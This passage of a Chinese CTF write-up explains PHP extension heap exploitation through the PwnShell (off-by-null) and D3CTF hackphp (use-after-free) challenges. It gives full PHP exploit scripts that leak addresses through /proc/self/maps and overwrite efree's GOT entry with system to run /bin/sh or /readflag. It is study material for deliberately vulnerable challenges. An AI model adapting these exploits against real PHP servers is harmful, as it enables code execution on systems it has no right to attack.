href=&#34;#%e5%ae%b9%e5%99%a8%e4%b8%8ewsl2%e4%b9%8b%e9%97%b4%e8%bf%9b%e8%a1%8c%e8%b0%83%e8%af%95&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;p&gt;如果用wsl2去远程调试容器里的程序，wsl2里：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;gdb&#xD;&#xA;target remote localhost:7777&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;&#xA;&lt;p&gt;通过&lt;code&gt;localhost&lt;/code&gt;连接需要容器映射端口到本地（参数&lt;code&gt;-p&lt;/code&gt;）：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$ docker run -it \                           &#xD;&#xA;-p 9999:9999 \&#xD;&#xA;-p 7777:7777 \&#xD;&#xA;--name d3ctf_hackphp \&#xD;&#xA;d3ctf_hackphp&lt;/code&gt;&lt;/pre&gt;&lt;/blockquote&gt;&#xA;&lt;p&gt;&lt;code&gt;phpgdb&lt;/code&gt;支持四个命令：&lt;code&gt;pheap&lt;/code&gt; &lt;code&gt;psmall&lt;/code&gt; &lt;code&gt;pelement&lt;/code&gt; &lt;code&gt;pstart&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;p alloc_globals.mm_heap&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;例题&#34;&gt;&lt;span&gt;例题&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e4%be%8b%e9%a2%98&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;堆off-by-nullpwnshell&#34;&gt;&lt;span&gt;堆off by null：PwnShell&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e5%a0%86off-by-nullpwnshell&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;p&gt;堆菜单题&lt;/p&gt;&#xA;&lt;p&gt;addHacker：参数是两个str，申请两个堆块，结构如下&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;//堆结构&#xD;&#xA;chunkList[idx] → heap2&#xD;&#xA;                 ┌──────────────────────────┐&#xD;&#xA;                 │ [0] = pointer to heap1   │&#xD;&#xA;                 │ [1] = len_string_1       │&#xD;&#xA;                 │ [2] ← string_2           │ &amp;lt;- off-by-null&#xD;&#xA;                 └──────────────────────────┘&#xD;&#xA;                             ↑&#xD;&#xA;                             │&#xD;&#xA;                             │&#xD;&#xA;                 ┌──────────────────────────┐&#xD;&#xA;                 │ heap1                    │&#xD;&#xA;                 │ [data] ← valu_1-&amp;gt;val&amp;#43;4   │&#xD;&#xA;                 └──────────────────────────┘&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;removeHacker：参数为lval，&lt;code&gt;efree&lt;/code&gt;掉相应chunklist中的堆块&lt;/p&gt;&#xA;&lt;p&gt;editHacker：参数一个lval，一个str。如果要写入的数据比原先heap1的少，就用原先的heap；否则free掉原来的heap1，申请一个堆块放数据&lt;/p&gt;&#xA;&lt;p&gt;交互：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function add($a, $b){&#xD;&#xA;    addHacker($a, $b);&#xD;&#xA;}&#xD;&#xA;function rm($a){&#xD;&#xA;    removeHacker($a);&#xD;&#xA;}&#xD;&#xA;function edit($a, $b){&#xD;&#xA;    editHacker($a, $b);&#xD;&#xA;}&#xD;&#xA;&#xD;&#xA;&#xD;&#xA;add(&amp;#34;abcdefghk&amp;#34;, &amp;#34;bbbbbbb&amp;#34;);&#xD;&#xA;edit(0,&amp;#34;aaaaaa&amp;#34;);&#xD;&#xA;rm(0);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;思路：&lt;/p&gt;&#xA;&lt;p&gt;主要漏洞在&lt;code&gt;addHacker&lt;/code&gt;中，存在&lt;code&gt;off-by-null&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt; *((_BYTE *)heap2 &amp;#43; len_2 &amp;#43; 16) = 0;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可以利用这个漏洞修改0x18大小的slot链表&lt;/p&gt;&#xA;&lt;p&gt;修改前：&lt;/p&gt;&#xA;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/img/phppwn/pwnshell_1.png&#34; title=&#34;/img/phppwn/pwnshell_1.png&#34; data-thumbnail=&#34;/img/phppwn/pwnshell_1.png&#34; data-sub-html=&#34;&lt;h2&gt;/img/phppwn/pwnshell_1.png&lt;/h2&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/img/phppwn/pwnshell_1.png&#39; alt=&#34;/img/phppwn/pwnshell_1.png&#34;&gt;&lt;/a&gt;&#xA;&lt;p&gt;修改后：&lt;/p&gt;&#xA;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/img/phppwn/pwnshell_2.png&#34; title=&#34;/img/phppwn/pwnshell_2.png&#34; data-thumbnail=&#34;/img/phppwn/pwnshell_2.png&#34; data-sub-html=&#34;&lt;h2&gt;/img/phppwn/pwnshell_2.png&lt;/h2&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/img/phppwn/pwnshell_2.png&#39; alt=&#34;/img/phppwn/pwnshell_2.png&#34;&gt;&lt;/a&gt;&#xA;&lt;p&gt;接着让&lt;code&gt;0x7daecbe57100&lt;/code&gt;指向&lt;code&gt;_efree_got&lt;/code&gt;，申请几次0x18大小的堆，改&lt;code&gt;efree_got&lt;/code&gt;为system&lt;/p&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;exp&#34;&gt;&lt;span&gt;exp&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#exp&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;p&gt;打的本地，远程改改system偏移，执行/readflag就行&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php&#xD;&#xA;function str2Hex($str) {&#xD;&#xA;    $hex = &amp;#34;&amp;#34;;&#xD;&#xA;    for ($i = strlen($str) - 1;$i &amp;gt;= 0;$i--) $hex.= dechex(ord($str[$i]));&#xD;&#xA;    $hex = strtoupper($hex);&#xD;&#xA;    return $hex;&#xD;&#xA;}&#xD;&#xA;function int2Str($i, $x = 8) {&#xD;&#xA;    $re = &amp;#34;&amp;#34;;&#xD;&#xA;    for ($j = 0; $j &amp;lt; $x; $j&amp;#43;&amp;#43;) {&#xD;&#xA;        $re .= pack(&amp;#39;C&amp;#39;, $i &amp;amp; 0xff);&#xD;&#xA;        $i &amp;gt;&amp;gt;= 8;&#xD;&#xA;    }&#xD;&#xA;    return $re;&#xD;&#xA;}&#xD;&#xA;function p64($value) {&#xD;&#xA;    return pack(&amp;#34;Q&amp;#34;, $value); // 64-bit little-endian&#xD;&#xA;}&#xD;&#xA;function p32($value) {&#xD;&#xA;    return pack(&amp;#34;V&amp;#34;, $value); // 32-bit little-endian&#xD;&#xA;}&#xD;&#xA;function u64($data) {&#xD;&#xA;    return unpack(&amp;#34;Q&amp;#34;, $data)[1]; // 64-bit little-endian&#xD;&#xA;}&#xD;&#xA;function u32($data) {&#xD;&#xA;    return unpack(&amp;#34;V&amp;#34;, $data)[1]; // 32-bit little-endian&#xD;&#xA;}&#xD;&#xA;function leakaddr($buffer){&#xD;&#xA;&#xD;&#xA;    global $libc, $mbase, $anon_maps;&#xD;&#xA;    $p = &amp;#39;/([0-9a-f]&amp;#43;)\-[0-9a-f]&amp;#43; .* \/usr\/lib\/x86_64-linux-gnu\/libc.so.6/&amp;#39;;&#xD;&#xA;    // $p1 = &amp;#39;/([0-9a-f]&amp;#43;)\-[0-9a-f]&amp;#43; .*  \/usr\/local\/lib\/php\/extensions\/no-debug-non-zts-20230831\/vuln.so/&amp;#39;;&#xD;&#xA;    $p1 = &amp;#39;/([0-9a-f]&amp;#43;)\-[0-9a-f]&amp;#43; .*  \/usr\/lib\/php\/20230831\/vuln.so/&amp;#39;;&#xD;&#xA;    preg_match_all($p, $buffer, $libc);&#xD;&#xA;    preg_match_all($p1, $buffer, $mbase);&#xD;&#xA;    &#xD;&#xA;    return &amp;#34;&amp;#34;;&#xD;&#xA;}&#xD;&#xA;&#xD;&#xA;$libc=&amp;#34;&amp;#34;;&#xD;&#xA;$mbase=&amp;#34;&amp;#34;;&#xD;&#xA;&#xD;&#xA;ob_start(&amp;#34;leakaddr&amp;#34;);&#xD;&#xA;include(&amp;#34;/proc/self/maps&amp;#34;);&#xD;&#xA;$buffer = ob_get_contents();&#xD;&#xA;ob_end_flush();&#xD;&#xA;leakaddr($buffer);&#xD;&#xA;$libc_base = hexdec($libc[1][0]);&#xD;&#xA;$mod_base = hexdec($mbase[1][0]);&#xD;&#xA;&#xD;&#xA;echo &amp;#34;libc base: 0x&amp;#34;.dechex($libc_base).&amp;#34;\n&amp;#34;;&#xD;&#xA;echo &amp;#34;mod base: 0x&amp;#34;.dechex($mod_base).&amp;#34;\n&amp;#34;;&#xD;&#xA;&#xD;&#xA;function add($a, $b){&#xD;&#xA;    addHacker($a, $b);&#xD;&#xA;}&#xD;&#xA;function rm($a){&#xD;&#xA;    removeHacker($a);&#xD;&#xA;}&#xD;&#xA;function edit($a, $b){&#xD;&#xA;    editHacker($a, $b);&#xD;&#xA;}&#xD;&#xA;&#xD;&#xA;$system = $libc_base &amp;#43; 0x58750;&#xD;&#xA;$efree_got = $mod_base &amp;#43; 0x4038;&#xD;&#xA;&#xD;&#xA;#先emalloc 0x10&amp;#43;后面，再emalloc 前面&#xD;&#xA;# heap2 heap1&#xD;&#xA;add(&amp;#34;/bin/sh&amp;#34;, str_repeat(&amp;#34;a&amp;#34;,7));    //0&#xD;&#xA;add(str_repeat(&amp;#34;b&amp;#34;,0x8), str_repeat(&amp;#34;b&amp;#34;,7));    //1&#xD;&#xA;add(str_repeat(&amp;#34;c&amp;#34;,0x8), str_repeat(&amp;#34;c&amp;#34;,7));    //2&#xD;&#xA;add(str_repeat(&amp;#34;d&amp;#34;,0x8), str_repeat(&amp;#34;d&amp;#34;,8));    //3&#xD;&#xA;&#xD;&#xA;//改_efree_got为system&#xD;&#xA;add(str_repeat(&amp;#34;a&amp;#34;,0x10).p64($efree_got),str_repeat(&amp;#34;a&amp;#34;,0x50));&#xD;&#xA;add(str_repeat(&amp;#34;a&amp;#34;,0x18),str_repeat(&amp;#34;a&amp;#34;,0x50));&#xD;&#xA;add(p64($system).p64(0).p64(0),str_repeat(&amp;#34;b&amp;#34;,0x50));&#xD;&#xA;&#xD;&#xA;edit(0,&amp;#34;aaaaaaaaaaaaaaaaaaaa&amp;#34;); //触发&#xD;&#xA;// tele &amp;amp;chunkList&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;堆uafhackphp&#34;&gt;&lt;span&gt;堆UAF：hackphp&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e5%a0%86uafhackphp&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;p&gt;题目来源：D3CTF 2021 hakphp&lt;/p&gt;&#xA;&lt;p&gt;参考：&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/UESuperGate/D3CTF-Source/blob/master/hackphp/exp.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://github.com/UESuperGate/D3CTF-Source/blob/master/hackphp/exp.php&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://www.anquanke.com/post/id/235237#h2-5&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://www.anquanke.com/post/id/235237#h2-5&lt;/a&gt;&lt;/p&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;思路&#34;&gt;&lt;span&gt;思路&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e6%80%9d%e8%b7%af&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;pre&gt;&lt;code&gt;void __fastcall zif_hackphp_create(zend_execute_data *execute_data, zval *return_value)&#xD;&#xA;{&#xD;&#xA;  zval *arg_num; // rdi&#xD;&#xA;  __int64 size[3]; // [rsp&amp;#43;0h] [rbp-18h] BYREF&#xD;&#xA;&#xD;&#xA;  arg_num = (zval *)execute_data-&amp;gt;This.u2.var_flags;&#xD;&#xA;  size[1] = __readfsqword(0x28u);&#xD;&#xA;  if ( (unsigned int)zend_parse_parameters(arg_num, &amp;amp;unk_2000, size) != -1 )&#xD;&#xA;  {&#xD;&#xA;    buf = (char *)_emalloc(size[0]);&#xD;&#xA;    buf_size = size[0];&#xD;&#xA;    if ( buf )&#xD;&#xA;    {&#xD;&#xA;      if ( (unsigned __int64)(size[0] - 0x100) &amp;lt;= 0x100 )&#xD;&#xA;      {&#xD;&#xA;        return_value-&amp;gt;u1.type_info = 3;&#xD;&#xA;        return;&#xD;&#xA;      }&#xD;&#xA;      _efree();&#xD;&#xA;    }&#xD;&#xA;  }&#xD;&#xA;  return_value-&amp;gt;u1.type_info = 2;&#xD;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里申请一个大于&lt;code&gt;0x200&lt;/code&gt;的堆块后，存在UAF，就可以修改&lt;code&gt;slot&lt;/code&gt;链表&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;str_repeat&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;str_repeat&lt;/code&gt;会调用&lt;code&gt;emalloc&lt;/code&gt;申请堆块，大小为（字符数+0x18）向上对齐一个&lt;code&gt;slot&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;需要把&lt;code&gt;str_repeat&lt;/code&gt;赋值给一个变量，不然这个堆块会被收回&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;$heap1 = str_repeat(&amp;quot;A&amp;quot;,0x1f0);&lt;/code&gt;后，返回的是&lt;code&gt;0x210&lt;/code&gt;大小的堆块，内存布局：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;pwndbg&amp;gt; dq 0x7e0878471000&#xD;&#xA;0x7e0878471000: 0x0000000600000001      0x0000000000000000&#xD;&#xA;0x7e0878471010: 0x00000000000001f0      0x4141414141414141&#xD;&#xA;0x7e0878471020: 0x4141414141414141      0x4141414141414141&#xD;&#xA;0x7e0878471030: 0x4141414141414141      0x4141414141414141&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里选择修改&lt;code&gt;efree_got&lt;/code&gt;为&lt;code&gt;system&lt;/code&gt;，然后&lt;code&gt;free&lt;/code&gt;掉一个存储字符串&lt;code&gt;/readflag&lt;/code&gt;的堆块&lt;/p&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;exp-1&#34;&gt;&lt;span&gt;exp&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#exp-1&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;?php&#xD;&#xA; &#xD;&#xA;$heap_base = 0;&#xD;&#xA;$libc_base = 0;&#xD;&#xA;$libc = &amp;#34;&amp;#34;;&#xD;&#xA;$mbase = &amp;#34;&amp;#34;;&#xD;&#xA;&#xD;&#xA;function p64($value) {&#xD;&#xA;    return pack(&amp;#34;Q&amp;#34;, $value);&#xD;&#xA;}&#xD;&#xA;function p32($value) {&#xD;&#xA;    return pack(&amp;#34;V&amp;#34;, $value);&#xD;&#xA;}&#xD;&#xA;function u64($data) {&#xD;&#xA;    return unpack(&amp;#34;Q&amp;#34;, $data)[1];&#xD;&#xA;}&#xD;&#xA;function u32($data) {&#xD;&#xA;    return unpack(&amp;#34;V&amp;#34;, $data)[1];&#xD;&#xA;}&#xD;&#xA;&#xD;&#xA;function leakaddr($buffer){&#xD;&#xA;    global $libc, $mbase;&#xD;&#xA;    $p = &amp;#39;/([0-9a-f]&amp;#43;)\-[0-9a-f]&amp;#43; .* \/usr\/lib\/x86_64-linux-gnu\/libc-2.31.so/&amp;#39;;&#xD;&#xA;    $p1 = &amp;#39;/([0-9a-f]&amp;#43;)\-[0-9a-f]&amp;#43; .*  \/usr\/local\/lib\/php\/extensions\/no-debug-non-zts-20190902\/hackphp.so/&amp;#39;;&#xD;&#xA;    preg_match_all($p, $buffer, $libc);&#xD;&#xA;    preg_match_all($p1, $buffer, $mbase);&#xD;&#xA;    return &amp;#34;&amp;#34;;&#xD;&#xA;}&#xD;&#xA;&#xD;&#xA;ob_start(&amp;#34;leakaddr&amp;#34;);&#xD;&#xA;include(&amp;#34;/proc/self/maps&amp;#34;);&#xD;&#xA;$buffer = ob_get_contents();&#xD;&#xA;ob_end_flush();&#xD;&#xA;leakaddr($buffer);&#xD;&#xA;&#xD;&#xA;$libc_base = hexdec($libc[1][0]);&#xD;&#xA;$modBase = hexdec($mbase[1][0]);&#xD;&#xA;&#xD;&#xA;$system = $libc_base &amp;#43; 0x52290;&#xD;&#xA;$efree_got = $modBase &amp;#43; 0x4070;&#xD;&#xA;&#xD;&#xA;echo &amp;#34;libc_base:0x&amp;#34; . dechex($libc_base) . &amp;#34;\n&amp;#34;;&#xD;&#xA;echo &amp;#34;modBase:0x&amp;#34; . dechex($modBase) . &amp;#34;\n&amp;#34;;&#xD;&#xA;&#xD;&#xA;hackphp_create(0x210);&#xD;&#xA;hackphp_edit(p64($modBase&amp;#43;0x4178-0x28));&#xD;&#xA;$heap1 = str_repeat(&amp;#34;A&amp;#34;,0x1f0);&#xD;&#xA;$heap1 = str_repeat(p64($modBase&amp;#43;0x4070),(0x1f0)/8);&#xD;&#xA;&#xD;&#xA;hackphp_edit(p64($system));&#xD;&#xA;hackphp_create(0x100);&#xD;&#xA;hackphp_edit(&amp;#34;/readflag&amp;#34;);&#xD;&#xA;hackphp_delete();&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;uafphpmaster&#34;&gt;&lt;span&gt;UAF：phpmaster&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#uafphpmaster&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;p&gt;题目来源：第二届长城杯半决赛 phpmaster&lt;/p&gt;&#xA;&lt;p&gt;参考：https://bbs.kanxue.com/thread-286086.htm&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;长城杯2025-php-pwn-simi-final-php-master&#34;&gt;&lt;span&gt;长城杯2025 (php-pwn) simi-final php-master&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e9%95%bf%e5%9f%8e%e6%9d%af2025-php-pwn-simi-final-php-master&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;p&gt;参考文章以及附件https://bbs.kanxue.com/thread-286567.htm&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;n1ctf-2024php-master&#34;&gt;&lt;span&gt;N1CTF 2024—php 